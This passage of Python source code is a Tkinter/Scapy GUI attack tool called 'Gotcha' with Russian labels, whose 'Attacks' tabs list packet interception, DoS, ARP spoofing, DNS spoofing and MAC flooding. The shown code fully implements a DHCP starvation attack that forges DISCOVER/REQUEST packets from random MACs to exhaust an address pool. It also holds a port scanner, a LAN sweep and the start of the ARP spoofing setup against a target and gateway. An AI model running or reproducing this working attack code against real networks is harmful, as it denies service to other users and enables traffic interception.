            dst_mac = self.eth_dst.get() if self.eth_dst.get() else "ff:ff:ff:ff:ff:ff"
            new_packet = Ether(src=self.eth_src.get(), dst=dst_mac)
        if self.ip_src.get() and self.ip_dst.get():
            src = self.ip_src.get()
            dst = self.ip_dst.get()
            try:
                socket.inet_pton(socket.AF_INET6, src)
                socket.inet_pton(socket.AF_INET6, dst)
                ip_packet = IPv6(src=src, dst=dst)
                if self.ip_ttl.get():
                    try:
                        ip_packet.hlim = int(self.ip_ttl.get())
                    except:
                        pass
            except socket.error:
                ip_packet = IP(src=src, dst=dst)
                if self.ip_ttl.get():
                    try:
                        ip_packet.ttl = int(self.ip_ttl.get())
                    except:
                        pass
            new_packet = new_packet / ip_packet
            proto = self.transport_proto.get()
            if proto == "TCP" and self.src_port.get() and self.dst_port.get():
                tcp_packet = TCP(sport=int(self.src_port.get()), dport=int(self.dst_port.get()))
                flags = 0
                if self.tcp_flags_vars["FIN"].get(): flags |= 0x01
                if self.tcp_flags_vars["SYN"].get(): flags |= 0x02
                if self.tcp_flags_vars["RST"].get(): flags |= 0x04
                if self.tcp_flags_vars["PSH"].get(): flags |= 0x08
                if self.tcp_flags_vars["ACK"].get(): flags |= 0x10
                if self.tcp_flags_vars["URG"].get(): flags |= 0x20
                if self.tcp_flags_vars["ECE"].get(): flags |= 0x40
                if self.tcp_flags_vars["CWR"].get(): flags |= 0x80
                tcp_packet.flags = flags
                new_packet = new_packet / tcp_packet
            elif proto == "UDP" and self.src_port.get() and self.dst_port.get():
                new_packet = new_packet / UDP(sport=int(self.src_port.get()), dport=int(self.dst_port.get()))
            elif proto == "ICMP":
                new_packet = new_packet / ICMP()
            payload_text = self.payload_data.get('1.0', 'end').strip()
            if payload_text:
                try:
                    payload_bytes = bytes.fromhex(payload_text.replace(' ', '').replace('\n', ''))
                    new_packet = new_packet / Raw(load=payload_bytes)
                except:
                    new_packet = new_packet / Raw(load=payload_text.encode())
        return new_packet

class Gotcha:
    def __init__(self, root):
        self.root = root
        self.root.title("Gotcha")
        self.root.geometry("1000x700")
        try:
            root.iconbitmap("other/images.ico")
        except:
            pass
        self.theme_manager = Theme(self.root)
        self.custom_stop_event = None
        self.custom_external_thread = None
        self.current_external_process = None
        self.sniffing_running = False
        self.dhcp_attack_running = False
        self.arp_spoof_running = False
        self.custom_attack_running = False
        self.packet_intercept_running = False
        self.mac_attack_running = False
        self.current_attack_type = None
        self.external_infinite = False
        self.last_offer_time = {}
        self.last_ack_time = {}
        self.external_processes = {}
        self.captured_packet = None
        self.intercept_thread = None
        self.selected_packet = None
        self.intercept_packets = []
        self.edited_packet = None
        self.raw_attack = RSattack()
        self.scapy_attack = Sattack()
        self.network_interfaces = self.get_interface_list()
        self.active_interface = self.get_active_interface()
        self.setup_gui()
        self.theme_manager.apply_theme("dark")
        self.system_monitor_running = True
        self.setup_system_monitor()
        # DNS Spoofing attributes
        self.dns_spoof_running = False
        self.dns_spoof_thread = None
        self.dns_spoof_stats = {
            'start_time': 0,
            'intercepted': 0,
            'spoofed': 0,
            'last_update': 0,
            'last_intercepted': 0,
            'last_spoofed': 0
        }
        self.dns_spoof_rules = {}  # domain_pattern -> ip
        self.dns_spoof_lock = threading.Lock()
        self.dns_spoof_ttl = 5

    def get_active_interface(self):
        for iface in self.network_interfaces:
            try:
                ip = get_if_addr(iface)
                if ip and ip != '0.0.0.0':
                    return iface
            except:
                continue
        return self.network_interfaces[0] if self.network_interfaces else "Ethernet"

    def setup_system_monitor(self):
        self.update_system_monitor()

    def update_system_monitor(self):
        try:
            cpu_percent = psutil.cpu_percent(interval=None)
            memory = psutil.virtual_memory()
            ram_percent = memory.percent
            self.cpu_label.config(text=f"CPU: {cpu_percent:.1f}%")
            self.ram_label.config(text=f"RAM: {ram_percent:.1f}%")
        except:
            self.cpu_label.config(text="CPU: N/A")
            self.ram_label.config(text="RAM: N/A")
        if self.system_monitor_running:
            self.root.after(1000, self.update_system_monitor)

    def get_interface_list(self):
        interfaces = []
        try:
            iface_list = get_if_list()
            for iface in iface_list:
                interfaces.append(iface)
        except:
            pass
        if not interfaces:
            interfaces = ["Ethernet", "Wi-Fi", "eth0", "wlan0"]
        return interfaces

    def setup_gui(self):
        main_notebook = ttk.Notebook(self.root)
        main_notebook.pack(fill='both', expand=True, padx=8, pady=8)
        auxiliary_frame = ttk.Frame(main_notebook)
        main_notebook.add(auxiliary_frame, text="Вспомогательное")
        auxiliary_notebook = ttk.Notebook(auxiliary_frame)
        auxiliary_notebook.pack(fill='both', expand=True, padx=8, pady=8)
        access_frame = ttk.Frame(auxiliary_notebook)
        auxiliary_notebook.add(access_frame, text="Доступ")
        self.setup_access_tab(access_frame)
        settings_frame = ttk.Frame(auxiliary_notebook)
        auxiliary_notebook.add(settings_frame, text="Настройки")
        self.setup_settings_tab(settings_frame)
        attacks_frame = ttk.Frame(main_notebook)
        main_notebook.add(attacks_frame, text="Атаки")
        attacks_notebook = ttk.Notebook(attacks_frame)
        attacks_notebook.pack(fill='both', expand=True, padx=8, pady=8)
        intercept_frame = ttk.Frame(attacks_notebook)
        attacks_notebook.add(intercept_frame, text="Перехват пакетов")
        self.setup_intercept_tab(intercept_frame)
        dhcp_frame = ttk.Frame(attacks_notebook)
        attacks_notebook.add(dhcp_frame, text="DHCP Starvation")
        self.setup_dhcp_tab(dhcp_frame)
        custom_frame = ttk.Frame(attacks_notebook)
        attacks_notebook.add(custom_frame, text="DoS атака")
        self.setup_custom_attack_tab(custom_frame)
        arp_spoof_frame = ttk.Frame(attacks_notebook)
        attacks_notebook.add(arp_spoof_frame, text="ARP Spoofing")
        self.setup_arp_spoof_tab(arp_spoof_frame)
        # DNS Spoofing tab
        dns_spoof_frame = ttk.Frame(attacks_notebook)
        attacks_notebook.add(dns_spoof_frame, text="DNS Spoofing")
        self.setup_dns_spoof_tab(dns_spoof_frame)
        mac_frame = ttk.Frame(attacks_notebook)
        attacks_notebook.add(mac_frame, text="MAC flood")
        self.setup_mac_flood_tab(mac_frame)
        self.status_var = tk.StringVar()
        self.status_var.set("Готов к работе")
        status_bar = ttk.Frame(self.root)
        status_bar.pack(side='bottom', fill='x')
        ttk.Label(status_bar, textvariable=self.status_var, relief='sunken', 
                 font=('Arial', 8), width=50).pack(side='left', fill='x', expand=True)
        self.cpu_label = ttk.Label(status_bar, text="CPU: 0%", relief='sunken', 
                                  font=('Arial', 8), width=12)
        self.cpu_label.pack(side='right', padx=(2, 0))
        self.ram_label = ttk.Label(status_bar, text="RAM: 0%", relief='sunken', 
                                  font=('Arial', 8), width=12)
        self.ram_label.pack(side='right', padx=(2, 10))

    # -------------------- Access tab (unchanged) --------------------
    def setup_access_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        top_frame = ttk.Frame(main_frame)
        top_frame.pack(fill='x', padx=5, pady=5)
        input_frame = ttk.LabelFrame(top_frame, text="Базовые функции доступа")
        input_frame.pack(fill='x', padx=5, pady=5)
        ttk.Label(input_frame, text="IP адрес:").grid(row=0, column=0, padx=4, pady=3, sticky='w')
        self.access_ip = ttk.Entry(input_frame, width=18, font=('Arial', 9))
        self.access_ip.grid(row=0, column=1, padx=4, pady=3, sticky='w')
        self.access_ip.insert(0, "192.168.1.1")
        ttk.Label(input_frame, text="Интерфейс:").grid(row=0, column=2, padx=4, pady=3, sticky='w')
        self.access_interface = ttk.Combobox(input_frame, width=15, font=('Arial', 9), values=self.network_interfaces)
        self.access_interface.grid(row=0, column=3, padx=4, pady=3, sticky='w')
        self.access_interface.set(self.active_interface)
        button_frame1 = ttk.Frame(input_frame)
        button_frame1.grid(row=1, column=0, columnspan=4, pady=6)
        ttk.Button(button_frame1, text="ICMP Ping", command=self.run_ping, width=12).pack(side='left', padx=3)
        ttk.Button(button_frame1, text="Port Scan", command=self.run_port_scan, width=12).pack(side='left', padx=3)
        ttk.Button(button_frame1, text="Traceroute", command=self.run_traceroute, width=12).pack(side='left', padx=3)
        button_frame2 = ttk.Frame(input_frame)
        button_frame2.grid(row=2, column=0, columnspan=4, pady=6)
        ttk.Button(button_frame2, text="Таблица маршрутизации", command=self.show_ip_route, width=20).pack(side='left', padx=2)
        ttk.Button(button_frame2, text="Сетевые адаптеры", command=self.show_network_info, width=18).pack(side='left', padx=2)
        ttk.Button(button_frame2, text="Сканировать сеть", command=self.net_scan, width=18).pack(side='left', padx=2)
        output_frame = ttk.LabelFrame(main_frame, text="Результаты")
        output_frame.pack(fill='both', expand=True, padx=5, pady=5)
        self.access_output = scrolledtext.ScrolledText(output_frame, height=18, wrap=tk.WORD, font=('Consolas', 8))
        self.access_output.pack(fill='both', expand=True, padx=5, pady=5)
        ttk.Button(output_frame, text="Сохранить лог", 
                  command=lambda: self.save_log(self.access_output), width=14).pack(pady=4)

    def net_scan(self):
        def scan_worker():
            ip = self.access_ip.get().strip()
            if not ip:
                self.access_output.insert('end', "Введите IP адрес (например, 192.168.1.1)\n")
                return
            parts = ip.split('.')
            if len(parts) != 4:
                self.access_output.insert('end', "Некорректный IP\n")
                return
            base = '.'.join(parts[:3]) + '.'
            self.access_output.insert('end', f"Сканирование сети {base}0/24... (это займёт около 2 секунд)\n")
            self.access_output.update()
            iface = self.access_interface.get()
            if not iface:
                iface = None
            try:
                ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=base + "0/24"),
                                timeout=2, verbose=0, iface=iface)
            except Exception as e:
                self.access_output.insert('end', f"Ошибка сканирования: {e}\n")
                return
            time.sleep(0.5)
            self.access_output.insert('end', "\n" + "="*60 + "\n")
            self.access_output.insert('end', "РЕЗУЛЬТАТЫ СКАНИРОВАНИЯ:\n")
            self.access_output.insert('end', f"{'IP':16} {'MAC':18} {'Hostname'}\n")
            self.access_output.insert('end', "-"*60 + "\n")
            if ans:
                for sent, received in ans:
                    ip_addr = received.psrc
                    mac_addr = received.hwsrc
                    hostname = ""
                    try:
                        hostname = socket.gethostbyaddr(ip_addr)[0]
                    except:
                        pass
                    self.access_output.insert('end', f"{ip_addr:16} {mac_addr:18} {hostname}\n")
            else:
                self.access_output.insert('end', "Ни одного хоста не найдено.\n")
            self.access_output.insert('end', "="*60 + "\n")
            self.access_output.insert('end', f"Сканирование завершено. Найдено {len(ans)} хостов.\n")
        threading.Thread(target=scan_worker, daemon=True).start()

    def run_ping(self):
        def ping_worker():
            ip = self.access_ip.get()
            self.access_output.insert('end', f"Ping {ip}...\n")
            self.access_output.see('end')
            try:
                process = subprocess.Popen(
                    ['ping', '-n', '4', ip],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    encoding='cp866',
                    errors='replace',
                    bufsize=1
                )
                for line in iter(process.stdout.readline, ''):
                    self.access_output.insert('end', line)
                    self.access_output.see('end')
                    self.root.update()
                process.stdout.close()
                process.wait()
            except Exception as e:
                self.access_output.insert('end', f"Ошибка: {str(e)}\n")
        threading.Thread(target=ping_worker, daemon=True).start()

    def run_port_scan(self):
        def worker():
            ip = self.access_ip.get()
            common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3389]
            self.access_output.insert('end', f"Сканирование портов {ip}...\n")
            for port in common_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    res = sock.connect_ex((ip, port))
                    if res == 0:
                        self.access_output.insert('end', f"Порт {port} открыт\n")
                    sock.close()
                except:
                    pass
            self.access_output.insert('end', "Сканирование завершено\n")
        threading.Thread(target=worker, daemon=True).start()

    def run_traceroute(self):
        def traceroute_worker():
            ip = self.access_ip.get()
            self.access_output.insert('end', f"Traceroute к {ip}...\n")
            self.access_output.see('end')
            try:
                if os.name == 'nt':
                    cmd = ['tracert', '-d', '-h', '30', '-w', '1000', ip]
                    encoding = 'cp866'
                else:
                    cmd = ['traceroute', '-n', '-m', '30', '-w', '1', ip]
                    encoding = 'utf-8'
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    encoding=encoding,
                    errors='replace',
                    bufsize=1
                )
                for line in iter(process.stdout.readline, ''):
                    self.access_output.insert('end', line)
                    self.access_output.see('end')
                    self.root.update()
                process.stdout.close()
                process.wait()
                self.access_output.insert('end', f"\nTraceroute завершен.\n")
                self.access_output.see('end')
            except Exception as e:
                self.access_output.insert('end', f"Ошибка Traceroute: {str(e)}\n")
        threading.Thread(target=traceroute_worker, daemon=True).start()

    def show_ip_route(self):
        def worker():
            self.access_output.insert('end', "=== ТАБЛИЦА МАРШРУТИЗАЦИИ ===\n")
            route_info = self.get_ip_route_formatted()
            self.access_output.insert('end', route_info + "\n")
        threading.Thread(target=worker, daemon=True).start()

    def get_ip_route_formatted(self):
        try:
            result = subprocess.run(['route', 'print'], capture_output=True, text=True, encoding='cp866', errors='replace')
            lines = result.stdout.split('\n')
            ipv4_section = []
            in_ipv4 = False
            for line in lines:
                if "IPv4 таблица маршрута" in line or "IPv4 Route Table" in line:
                    in_ipv4 = True
                    continue
                if in_ipv4 and ("IPv6 таблица маршрута" in line or "IPv6 Route Table" in line):
                    break
                if in_ipv4:
                    if line.strip() or '=' in line:
                        ipv4_section.append(line.rstrip())
            if not ipv4_section:
                return "=== ТАБЛИЦА МАРШРУТИЗАЦИИ ===\nНе удалось найти IPv4 маршруты.\n"
            output = "=== ТАБЛИЦА МАРШРУТИЗАЦИИ ===\n\n" + "\n".join(ipv4_section)
            return output
        except Exception as e:
            return f"=== ТАБЛИЦА МАРШРУТИЗАЦИИ ===\nОшибка: {str(e)}"

    def show_network_info(self):
        def worker():
            self.access_output.insert('end', "=== СЕТЕВЫЕ АДАПТЕРЫ ===\n")
            info = self.get_network_adapters()
            self.access_output.insert('end', info + "\n")
        threading.Thread(target=worker, daemon=True).start()

    def get_network_adapters(self):
        try:
            interfaces = get_if_list()
            result = []
            for iface in interfaces:
                display_name = iface
                if not iface.startswith(r'\Device\NPF_'):
                    display_name = r'\Device\NPF_' + iface
                result.append(f"Интерфейс: {display_name}")
                try:
                    ip = get_if_addr(iface)
                    mac = get_if_hwaddr(iface)
                    result.append(f"  IP: {ip}, MAC: {mac}")
                except:
                    result.append(f"  Не удалось получить информацию")
                result.append("")
            return "\n".join(result)
        except Exception as e:
            return f"Ошибка получения сетевых адаптеров: {str(e)}"

    # -------------------- DHCP Starvation (unchanged) --------------------
    def setup_dhcp_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        left_frame = ttk.Frame(main_frame)
        left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side='right', fill='both', padx=5, pady=5, expand=True)
        params_frame = ttk.LabelFrame(left_frame, text="Параметры DHCP Starvation")
        params_frame.pack(fill='x', padx=5, pady=5)
        row1 = ttk.Frame(params_frame)
        row1.pack(fill='x', padx=5, pady=5)
        ttk.Label(row1, text="Интерфейс:", width=12).pack(side='left', padx=2)
        self.dhcp_interface = ttk.Combobox(row1, width=25, font=('Arial', 9), values=self.network_interfaces)
        self.dhcp_interface.pack(side='left', padx=2)
        self.dhcp_interface.set(self.active_interface)
        row2 = ttk.Frame(params_frame)
        row2.pack(fill='x', padx=5, pady=5)
        ttk.Label(row2, text="Размер пула:", width=12).pack(side='left', padx=2)
        self.dhcp_pool_size = ttk.Entry(row2, width=10, font=('Arial', 9))
        self.dhcp_pool_size.pack(side='left', padx=2)
        self.dhcp_pool_size.insert(0, "254")
        row3 = ttk.Frame(params_frame)
        row3.pack(fill='x', padx=5, pady=5)
        ttk.Label(row3, text="Кол-во запросов:", width=12).pack(side='left', padx=2)
        self.dhcp_request_count = ttk.Entry(row3, width=10, font=('Arial', 9))
        self.dhcp_request_count.pack(side='left', padx=2)
        self.dhcp_request_count.insert(0, "1000")
        row4 = ttk.Frame(params_frame)
        row4.pack(fill='x', padx=5, pady=5)
        ttk.Label(row4, text="Задержка (сек):", width=12).pack(side='left', padx=2)
        self.dhcp_delay = ttk.Entry(row4, width=10, font=('Arial', 9))
        self.dhcp_delay.pack(side='left', padx=2)
        self.dhcp_delay.insert(0, "0.05")
        row5 = ttk.Frame(params_frame)
        row5.pack(fill='x', padx=5, pady=5)
        ttk.Label(row5, text="Таймаут Offer (сек):", width=18).pack(side='left', padx=2)
        self.dhcp_offer_timeout = ttk.Entry(row5, width=10, font=('Arial', 9))
        self.dhcp_offer_timeout.pack(side='left', padx=2)
        self.dhcp_offer_timeout.insert(0, "30")
        row6 = ttk.Frame(params_frame)
        row6.pack(fill='x', padx=5, pady=5)
        ttk.Label(row6, text="Таймаут ACK (сек):", width=18).pack(side='left', padx=2)
        self.dhcp_ack_timeout = ttk.Entry(row6, width=10, font=('Arial', 9))
        self.dhcp_ack_timeout.pack(side='left', padx=2)
        self.dhcp_ack_timeout.insert(0, "5")
        button_frame = ttk.Frame(params_frame)
        button_frame.pack(fill='x', padx=5, pady=10)
        self.dhcp_start_btn = ttk.Button(button_frame, text="Начать DHCP Starvation", 
                                       command=self.start_dhcp_attack, width=20)
        self.dhcp_start_btn.pack(side='left', padx=5)
        self.dhcp_stop_btn = ttk.Button(button_frame, text="Остановить", 
                                      command=self.stop_dhcp_attack, width=15, state='disabled')
        self.dhcp_stop_btn.pack(side='left', padx=5)
        stats_frame = ttk.LabelFrame(left_frame, text="Статистика")
        stats_frame.pack(fill='x', padx=5, pady=5)
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='x', padx=5, pady=5)
        ttk.Label(stats_grid, text="Отправлено пакетов:", width=20, anchor='w').grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.dhcp_sent = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.dhcp_sent.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(stats_grid, text="Скорость (pps):", width=20, anchor='w').grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.dhcp_rate = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.dhcp_rate.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(stats_grid, text="Уникальных MAC:", width=20, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
        self.dhcp_unique = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.dhcp_unique.grid(row=2, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(stats_grid, text="Время работы:", width=20, anchor='w').grid(row=3, column=0, padx=5, pady=2, sticky='w')
        self.dhcp_time = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
        self.dhcp_time.grid(row=3, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(stats_grid, text="Захваченные IP:", width=20, anchor='w').grid(row=4, column=0, padx=5, pady=2, sticky='w')
        self.dhcp_offered_label = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.dhcp_offered_label.grid(row=4, column=1, padx=5, pady=2, sticky='w')
        log_frame = ttk.LabelFrame(right_frame, text="Лог DHCP Starvation")
        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        self.dhcp_log = scrolledtext.ScrolledText(log_frame, height=30, wrap=tk.WORD, font=('Consolas', 8))
        self.dhcp_log.pack(fill='both', expand=True, padx=5, pady=5)
        btn_frame = ttk.Frame(log_frame)
        btn_frame.pack(fill='x', padx=5, pady=5)
        ttk.Button(btn_frame, text="Сохранить лог", 
                  command=lambda: self.save_log(self.dhcp_log), width=14).pack()
        self.dhcp_stats = {
            'start_time': 0,
            'sent_packets': 0,
            'unique_macs': set(),
            'last_update': 0,
            'last_sent': 0
        }
        self.dhcp_offered_ips = set()
        self.dhcp_offers = {}                     
        self.dhcp_lock = threading.Lock()
        self.dhcp_sniff_stop = None
        self.dhcp_sniff_thread = None

    def start_dhcp_attack(self):
        self.dhcp_attack_running = True
        self.dhcp_start_btn.config(state='disabled')
        self.dhcp_stop_btn.config(state='normal')
        try:
            pool_size = int(self.dhcp_pool_size.get())
            request_count = int(self.dhcp_request_count.get())
            delay = float(self.dhcp_delay.get())
            offer_timeout = int(self.dhcp_offer_timeout.get())
            ack_timeout = int(self.dhcp_ack_timeout.get())
        except:
            pool_size = 254
            request_count = 1000
            delay = 0.005
            offer_timeout = 30
            ack_timeout = 5
        self.dhcp_stats = {
            'start_time': time.time(),
            'sent_packets': 0,
            'unique_macs': set(),
            'last_update': time.time(),
            'last_sent': 0
        }
        with self.dhcp_lock:
            self.dhcp_offered_ips.clear()
            self.dhcp_offers.clear()
        self.dhcp_sniff_stop = threading.Event()
        self.dhcp_sniff_thread = threading.Thread(target=self.dhcp_sniff_worker, args=(self.dhcp_interface.get(),))
        self.dhcp_sniff_thread.daemon = True
        self.dhcp_sniff_thread.start()
        self.dhcp_thread = threading.Thread(
            target=self.dhcp_attack_worker,
            args=(self.dhcp_interface.get(), pool_size, request_count, delay, offer_timeout, ack_timeout)
        )
        self.dhcp_thread.daemon = True
        self.dhcp_thread.start()
        self.update_dhcp_stats()
        self.dhcp_log.insert('end', f"DHCP Starvation started (pool size: {pool_size} IPs)\n")
        self.dhcp_log.insert('end', f"Interface: {self.dhcp_interface.get()}\n")
        self.status_var.set("DHCP Starvation запущена")

    def dhcp_sniff_worker(self, iface):
        def handle_packet(pkt):
            if not self.dhcp_attack_running:
                return True
            if DHCP in pkt:
                msg_type = None
                for opt in pkt[DHCP].options:
                    if opt[0] == 'message-type':
                        msg_type = opt[1]
                        break
                if msg_type == 2:         
                    try:
                        xid = pkt[BOOTP].xid
                        offered_ip = pkt[BOOTP].yiaddr
                        if offered_ip != '0.0.0.0':
                            now = time.time()
                            if xid in self.last_offer_time and (now - self.last_offer_time[xid]) < 0.5:
                                return False
                            self.last_offer_time[xid] = now
                            with self.dhcp_lock:
                                self.dhcp_offers[xid] = offered_ip
                            self.dhcp_log.insert('end', f"[OFFER] IP {offered_ip} для xid {xid}\n")
                    except:
                        pass
                elif msg_type == 5:       
                    try:
                        xid = pkt[BOOTP].xid
                        ip = pkt[BOOTP].yiaddr
                        now = time.time()
                        if xid in self.last_ack_time and (now - self.last_ack_time[xid]) < 0.5:
                            return False
                        self.last_ack_time[xid] = now
                        with self.dhcp_lock:
                            self.dhcp_offered_ips.add(ip)
                        self.dhcp_log.insert('end', f"[ACK] IP {ip} подтверждён\n")
                    except:
                        pass
            return False
        sniff(iface=iface, filter="udp port 67 or udp port 68", prn=handle_packet,
            stop_filter=lambda x: not self.dhcp_attack_running)

    def stop_dhcp_attack(self):
        self.dhcp_attack_running = False
        self.dhcp_start_btn.config(state='normal')
        self.dhcp_stop_btn.config(state='disabled')
        if self.dhcp_sniff_stop:
            self.dhcp_sniff_stop.set()
        if self.dhcp_sniff_thread and self.dhcp_sniff_thread.is_alive():
            self.dhcp_sniff_thread.join(timeout=2.0)
        if self.dhcp_thread and self.dhcp_thread.is_alive():
            self.dhcp_thread.join(timeout=1.0)
        total_time = time.time() - self.dhcp_stats['start_time']
        total_packets = self.dhcp_stats['sent_packets']
        total_bytes = total_packets * 590                      
        self.dhcp_log.insert('end', "\n--- Results ---\n")
        self.dhcp_log.insert('end', f"Total packets sent: {total_packets}\n")
        self.dhcp_log.insert('end', f"Unique MACs: {len(self.dhcp_stats['unique_macs'])}\n")
        with self.dhcp_lock:
            if self.dhcp_offered_ips:
                self.dhcp_log.insert('end', "\n--- Захваченные IP (DHCP ACK) ---\n")
                for ip in sorted(self.dhcp_offered_ips):
                    self.dhcp_log.insert('end', f"{ip}\n")
        self.dhcp_log.insert('end', f"Duration: {total_time*1000:.0f} ms\n")
        if total_time > 0:
            self.dhcp_log.insert('end', f"Avg rate: {int(total_packets/total_time)} pps\n")
        self.dhcp_log.insert('end', f"Total data: {total_bytes} bytes\n")
        if total_time > 0:
            self.dhcp_log.insert('end', f"Throughput: {(total_bytes*8/total_time/1e6):.2f} Mbps\n")
        self.status_var.set("DHCP Starvation остановлена")

    def update_dhcp_stats(self):
        if not self.dhcp_attack_running:
            return
        current_time = time.time()
        duration = current_time - self.dhcp_stats['start_time']
        time_diff = current_time - self.dhcp_stats['last_update']
        if time_diff >= 1:
            packets_sent = self.dhcp_stats['sent_packets'] - self.dhcp_stats.get('last_sent', 0)
            current_rate = packets_sent / time_diff if time_diff > 0 else 0
            self.dhcp_rate.config(text=f"{int(current_rate)}")
            self.dhcp_stats['last_update'] = current_time
            self.dhcp_stats['last_sent'] = self.dhcp_stats['sent_packets']
        self.dhcp_sent.config(text=str(self.dhcp_stats['sent_packets']))
        self.dhcp_unique.config(text=str(len(self.dhcp_stats['unique_macs'])))
        with self.dhcp_lock:
            self.dhcp_offered_label.config(text=str(len(self.dhcp_offered_ips)))
        hours = int(duration // 3600)
        minutes = int((duration % 3600) // 60)
        seconds = int(duration % 60)
        self.dhcp_time.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        if self.dhcp_attack_running:
            self.root.after(1000, self.update_dhcp_stats)

    def dhcp_attack_worker(self, interface, pool_size, request_count, delay, offer_timeout, ack_timeout):
        try:
            packet_count = 0
            used_macs = set()
            while self.dhcp_attack_running and packet_count < request_count:
                mac = self.generate_random_mac()
                if mac in used_macs:
                    continue
                used_macs.add(mac)
                self.dhcp_stats['unique_macs'].add(mac)                           
                used_macs.add(mac)
                mac_bytes = bytes.fromhex(mac.replace(':', ''))
                xid = random.randint(1, 0xFFFFFFFF)
                dhcp_discover = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                            IP(src="0.0.0.0", dst="255.255.255.255") / \
                            UDP(sport=68, dport=67) / \
                            BOOTP(chaddr=mac_bytes, xid=xid) / \
                            DHCP(options=[("message-type", "discover"), "end"])
                sendp(dhcp_discover, iface=interface, verbose=0)
                packet_count += 1
                self.dhcp_stats['sent_packets'] = packet_count
                offer_deadline = time.time() + offer_timeout
                offered_ip = None
                while time.time() < offer_deadline and self.dhcp_attack_running:
                    with self.dhcp_lock:
                        if xid in self.dhcp_offers:
                            offered_ip = self.dhcp_offers.pop(xid)
                            break
                    time.sleep(0.1)                            
                if offered_ip:
                    dhcp_request = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                                IP(src="0.0.0.0", dst="255.255.255.255") / \
                                UDP(sport=68, dport=67) / \
                                BOOTP(chaddr=mac_bytes, xid=xid) / \
                                DHCP(options=[("message-type", "request"),
                                            ("requested_addr", offered_ip),
                                            "end"])
                    sendp(dhcp_request, iface=interface, verbose=0)
                    packet_count += 1
                    self.dhcp_stats['sent_packets'] = packet_count
                    ack_deadline = time.time() + ack_timeout
                    ack_received = False
                    while time.time() < ack_deadline and self.dhcp_attack_running:
                        with self.dhcp_lock:
                            if offered_ip in self.dhcp_offered_ips:
                                ack_received = True
                                break
                        time.sleep(0.1)
                    if ack_received:
                        self.dhcp_log.insert('end', f"[CAPTURED] IP {offered_ip} подтверждён (ACK)\n")
                    else:
                        self.dhcp_log.insert('end', f"[WARN] Не получен ACK для IP {offered_ip} (таймаут {ack_timeout} сек)\n")
                else:
                    self.dhcp_log.insert('end', f"[WARN] Не получен offer для {mac} (таймаут {offer_timeout} сек)\n")
                if delay > 0:
                    time.sleep(delay)
                if len(used_macs) >= pool_size:
                    used_macs.clear()
                    time.sleep(1)
        except Exception as e:
            self.dhcp_log.insert('end', f"DHCP Starvation error: {str(e)}\n")
            self.stop_dhcp_attack()

    # -------------------- ARP Spoofing (unchanged) --------------------
    def setup_arp_spoof_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        left_frame = ttk.Frame(main_frame)
        left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side='right', fill='both', padx=5, pady=5, expand=True)
        params_frame = ttk.LabelFrame(left_frame, text="Параметры ARP Spoofing")
        params_frame.pack(fill='x', padx=5, pady=5)
        row1 = ttk.Frame(params_frame)
        row1.pack(fill='x', padx=5, pady=5)
        ttk.Label(row1, text="IP цели:", width=12).pack(side='left', padx=2)
        self.arp_target_ip = ttk.Entry(row1, width=25, font=('Arial', 9))
        self.arp_target_ip.pack(side='left', padx=2)
        self.arp_target_ip.insert(0, "192.168.1.2")
        row2 = ttk.Frame(params_frame)
        row2.pack(fill='x', padx=5, pady=5)
        ttk.Label(row2, text="IP шлюза:", width=12).pack(side='left', padx=2)
        self.arp_gateway_ip = ttk.Entry(row2, width=25, font=('Arial', 9))
        self.arp_gateway_ip.pack(side='left', padx=2)
        self.arp_gateway_ip.insert(0, "192.168.1.1")
        row3 = ttk.Frame(params_frame)
        row3.pack(fill='x', padx=5, pady=5)
        ttk.Label(row3, text="Интерфейс:", width=12).pack(side='left', padx=2)
        self.arp_spoof_interface = ttk.Combobox(row3, width=25, font=('Arial', 9), values=self.network_interfaces)
        self.arp_spoof_interface.pack(side='left', padx=2)
        self.arp_spoof_interface.set(self.active_interface)
        row4 = ttk.Frame(params_frame)
        row4.pack(fill='x', padx=5, pady=5)
        ttk.Label(row4, text="Интервал (сек):", width=12).pack(side='left', padx=2)
        self.arp_spoof_interval = ttk.Entry(row4, width=10, font=('Arial', 9))
        self.arp_spoof_interval.pack(side='left', padx=2)
        self.arp_spoof_interval.insert(0, "2")
        self.restore_arp_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(params_frame, text="Восстанавливать ARP после остановки", variable=self.restore_arp_var).pack(anchor='w', padx=5, pady=2)
        button_frame = ttk.Frame(params_frame)
        button_frame.pack(fill='x', padx=5, pady=10)
        self.arp_spoof_start_btn = ttk.Button(button_frame, text="Начать ARP Spoofing", 
                                            command=self.start_arp_spoof, width=18)
        self.arp_spoof_start_btn.pack(side='left', padx=5)
